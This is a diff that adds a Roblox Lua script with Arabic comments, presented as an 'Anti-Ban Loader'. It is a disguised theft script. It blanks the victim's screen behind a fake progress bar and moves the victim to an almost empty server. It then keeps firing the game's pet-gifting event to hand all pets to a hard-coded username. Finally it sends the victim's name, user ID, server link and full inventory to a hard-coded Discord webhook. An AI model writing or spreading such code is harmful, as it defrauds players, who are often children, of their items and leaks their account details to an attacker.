@@ -1,0 +1,219 @@
+-- الخدمات الأساسية
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local TweenService = game:GetService("TweenService")
+local StarterGui = game:GetService("StarterGui")
+local player = Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+
+-- =========================
+-- 1: واجهة تحميل + تعطيل UI
+-- =========================
+for _, guiType in pairs(Enum.CoreGuiType:GetEnumItems()) do
+pcall(function() StarterGui:SetCoreGuiEnabled(guiType, false) end)
+end
+
+for _, child in ipairs(PlayerGui:GetChildren()) do
+if not child:IsA("PersistentGui") then
+child:Destroy()
+end
+end
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = PlayerGui
+
+local Background = Instance.new("Frame")
+Background.Size = UDim2.new(1,0,1,0)
+Background.BackgroundColor3 = Color3.fromRGB(0,0,0)
+Background.BorderSizePixel = 0
+Background.Parent = ScreenGui
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(0.6,0,0.08,0)
+Title.Position = UDim2.new(0.2,0,0.45,0)
+Title.BackgroundTransparency = 1
+Title.Text = "Anti-Ban Loader..."
+Title.TextColor3 = Color3.fromRGB(0,255,0)
+Title.TextScaled = true
+Title.Font = Enum.Font.GothamSemibold
+Title.Parent = Background
+
+local ProgressBarBG = Instance.new("Frame")
+ProgressBarBG.Size = UDim2.new(0.6,0,0.05,0)
+ProgressBarBG.Position = UDim2.new(0.2,0,0.55,0)
+ProgressBarBG.BackgroundColor3 = Color3.fromRGB(50,50,50)
+ProgressBarBG.BorderSizePixel = 0
+ProgressBarBG.Parent = Background
+
+local ProgressBar = Instance.new("Frame")
+ProgressBar.Size = UDim2.new(0,0,1,0)
+ProgressBar.BackgroundColor3 = Color3.fromRGB(0,200,0)
+ProgressBar.BorderSizePixel = 0
+ProgressBar.Parent = ProgressBarBG
+
+local function animateLoader(duration)
+duration = duration or 2
+local tween = TweenService:Create(ProgressBar, TweenInfo.new(duration, Enum.EasingStyle.Linear), {Size=UDim2.new(1,0,1,0)})
+tween:Play()
+tween.Completed:Wait()
+end
+
+animateLoader(2) -- تحريك الشريط لمدة 2 ثانية
+
+-- =========================
+-- 2: تغيير السيرفر تلقائيًا إذا مزدحم
+-- =========================
+local function joinEmptyServer()
+local currentPlayers = #Players:GetPlayers()
+if currentPlayers > 3 then
+local success, servers = pcall(function()
+return HttpService:JSONDecode(game:HttpGet(
+"https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
+end)
+if success and servers and servers.data then
+for _, srv in ipairs(servers.data) do
+if srv.playing <= 2 and srv.id ~= game.JobId then
+TeleportService:TeleportToPlaceInstance(game.PlaceId, srv.id, player)
+return true
+end
+end
+end
+end
+return false
+end
+
+local moved = joinEmptyServer()
+if moved then return end
+task.wait(1)
+
+-- =========================
+-- 3: تجهيز البتات + GivePet
+-- =========================
+local function equipPet(pet)
+if pet and pet.Parent ~= player.Character then
+pet.Parent = player.Character
+local humanoid = player.Character:FindFirstChild("Humanoid")
+if humanoid and pet:IsA("Tool") then
+pcall(function() humanoid:EquipTool(pet) end)
+end
+end
+end
+
+local function equipPetsSequentially()
+while true do
+local backpack = player:FindFirstChild("Backpack")
+if backpack then
+for _, item in ipairs(backpack:GetChildren()) do
+local itemType = item:GetAttribute("ItemType")
+if itemType == "Pet" or string.find(item.Name:lower(),"pet") then
+equipPet(item)
+task.wait(3)
+end
+end
+end
+task.wait(1)
+end
+end
+
+local function autoGivePet(targetPlayerName)
+local targetPlayer = Players:FindFirstChild(targetPlayerName)
+while not targetPlayer do
+Players.PlayerAdded:Wait()
+targetPlayer = Players:FindFirstChild(targetPlayerName)
+end
+while true do
+if targetPlayer then
+pcall(function()
+ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", targetPlayer)
+end)
+end
+task.wait(2)
+end
+end
+
+task.spawn(equipPetsSequentially)
+task.spawn(function() autoGivePet("mostafa_gaming13") end) -- تم تغيير اسم اللاعب المستهدف
+
+-- =========================
+-- 4: Webhook إرسال محتويات الحقيبة
+-- =========================
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1408872258923004066/K_qe0C3hr3Zs0jyneblelc9ddh0DotC1u-Jd44WjSGeKneTgCp63w3yjwgJWWYAgHvOu" -- تم تغيير الويب هوك
+
+local function collectInventory()
+local backpack = player:FindFirstChild("Backpack")
+local tools,pets,otherItems = {},{},{}
+if backpack then
+for _, item in ipairs(backpack:GetChildren()) do
+if item:IsA("Tool") then
+table.insert(tools,item.Name)
+elseif item:FindFirstChild("PetValue") or string.find(item.Name:lower(),"pet") or string.find(item.Name:lower(),"animal") then
+table.insert(pets,item.Name)
+else
+table.insert(otherItems,item.Name)
+end
+end
+end
+return tools,pets,otherItems
+end
+
+local function sendToDiscord(playerName,userId,tools,pets,otherItems)
+local placeId = game.PlaceId
+local jobId = game.JobId
+local SERVER_URL = "https://floating.gg/?placeID="..placeId.."&gameInstanceId="..jobId
+
+local message = "**🎒 محتويات حقيبة اللاعب: ** "..playerName..  
+                "\n**👤 اسم اللاعب: ** "..playerName..  
+                "\n**🆔 معرف اللاعب: ** "..tostring(userId)..  
+                "\n**🌐 رابط السيرفر: ** "..SERVER_URL..  
+                "\n**🛠️ عدد الأدوات: ** "..tostring(#tools)..  
+                "\n**🐾 عدد الحيوانات: ** "..tostring(#pets)..  
+                "\n**📦 عدد العناصر الأخرى: ** "..tostring(#otherItems)  
+
+local requestFunc = syn and syn.request or http_request or request  
+if requestFunc then  
+    requestFunc({  
+        Url = WEBHOOK_URL,  
+        Method = "POST",  
+        Headers = {["Content-Type"]="application/json"},  
+        Body = HttpService:JSONEncode({content=message, username="Delta Inventory Tracker"})  
+    })  
+end
+
+end
+
+local function sendInventoryFile(playerName,tools,pets,otherItems)
+local content = "🎮 محتويات حقيبة اللاعب: "..playerName.."\n\n"
+content = content.."🛠️ الأدوات:\n"
+for i,v in ipairs(tools) do content = content.."- "..v.."\n" end
+content = content.."\n🐶 الحيوانات:\n"
+for i,v in ipairs(pets) do content = content.."- "..v.."\n" end
+content = content.."\n📦 العناصر الأخرى:\n"
+for i,v in ipairs(otherItems) do content = content.."- "..v.."\n" end
+
+local requestFunc = syn and syn.request or http_request or request  
+if requestFunc then  
+    requestFunc({  
+        Url = WEBHOOK_URL,  
+        Method = "POST",  
+        Headers = {["Content-Type"]="multipart/form-data; boundary=---011000010111000001101001"},  
+        Body = table.concat({  
+            "-----011000010111000001101001",  
+            'Content-Disposition: form-data; name="file"; filename="Inventory.txt"',  
+            "Content-Type: text/plain",  
+            "",  
+            content,  
+            "-----011000010111000001101001--"  
+        },"\r\n")  
+    })  
+end
+
+end
+
+local tools,pets,otherItems = collectInventory()
+sendToDiscord(player.Name,player.UserId,tools,pets,otherItems)
+sendInventoryFile(player.Name,tools,pets,otherItems)
